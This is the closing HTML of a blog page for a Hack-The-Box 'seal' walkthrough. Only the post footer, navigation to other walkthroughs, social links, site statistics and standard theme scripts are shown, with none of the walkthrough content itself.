      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/07/12/seal/" title="Hack-The-Box-walkthrough[seal]">https://fdlucifer.github.io/2021/07/12/seal/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/07/10/intelligence/" rel="prev" title="Hack-The-Box-walkthrough[intelligence]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[intelligence]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/07/20/pikaboo/" rel="next" title="Hack-The-Box-walkthrough[pikaboo]">
                  Hack-The-Box-walkthrough[pikaboo] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">642k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:53</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
